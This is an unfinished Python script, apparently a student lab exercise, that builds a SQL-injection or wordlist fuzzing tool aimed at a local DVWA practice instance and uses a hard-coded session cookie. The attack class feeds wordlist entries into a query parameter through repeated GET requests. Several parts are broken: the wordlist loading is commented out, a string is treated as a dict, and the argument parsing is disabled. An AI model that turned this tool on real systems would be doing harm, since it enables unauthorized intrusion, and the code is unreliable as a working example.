import requests
import getopt
import sys
from collections import deque

def usage():
    pass

class ItemChangeNotDefined(Exception):
    def __init__(self) -> None:
        super().__init__("Item a ser mudado não foi defino!")

class SlqInjectionAttack():
    
    @property
    def url(self):
        return self._url
    
    @url.setter
    def url(self,url):
        self._url = url
    
    @property
    def key_to_change(self):
        return self._key_to_change
        
    @key_to_change.setter
    def key_to_change(self,key):
        self._key_to_change = key
    
    @property
    def querys(self):
        return self._querys
    
    @querys.setter
    def querys(self,querys):
        items_querys = querys.split("&")
        self._key_to_change = None
        for key,item in [ i.split("=") for i in items_querys]:
            if item == "^PASS":
                self.key_to_change = key
        if self.key_to_change is not None:
            self._querys = querys
        else:
            raise ItemChangeNotDefined()
    
    @property
    def wordlist(self):
        try:
            return self._wordlist
        except:
            return None
    
    @wordlist.setter
    def wordlist(self,wordlist):
        self._wordlist = deque()
        with open(wordlist,"r") as file:
            for word in file:
                self._wordlist.append(word.strip())
      
    @property
    def cookies(self):
        return self._cookies
    
    @cookies.setter
    def cookies(self,cookies):
        if cookies == None:
            self._cookies = {}
        else:
            self._cookies = self.string_to_dict(cookies,";")
            
    def string_to_dict(self,string,separator):
        dict = {}
        itens_string = string.split(separator)
        
        dict.update({key.strip():item.strip() for key,item in [ i.split("=") for i in itens_string]})
            
        return dict            
    
    def __init__(self,url,wordlist,cookies=None):
        try:
            self.url,self.querys = url.split('?')
            # self.wordlist = wordlist.strip()
            self.cookies = cookies.strip()
        except ItemChangeNotDefined as e:
            print(e)
        except Exception as e:
            print(e)
    
    def change_item(self):
        self.querys.update({self.key_to_change:self.wordlist.pop()})
    
    def send_get_request(self):
        requests.get(url = self.url + "?" + self.querys,cookies=self.cookies)
    
    def attack(self):
        while len(self.wordlist):  
            self.send_get_request()
            self.change_item()

ataque = SlqInjectionAttack("http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=^PASS&Submit=Submit#","teste.txt","security=low; PHPSESSID=hbrihmeutj4oo69uunadpp2mne")
print(ataque.url)  
print(ataque.querys)  
print(ataque.wordlist)  
print(ataque.cookies)  
#http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
# if __name__ == "__main__":
#     try:
#         options, _ = getopt.getopt(sys[1:],['',])
#         if len(options) == 0:
#             raise getopt.GetoptError('Argumento inválido')
        
#         for command, argument in options:
#             pass
        
#     except getopt.GetoptError as e:
#         print(e)
#     except ItemChangeNotDefined as e:
#         print(e)
#     except Exception as e:
#         print(e)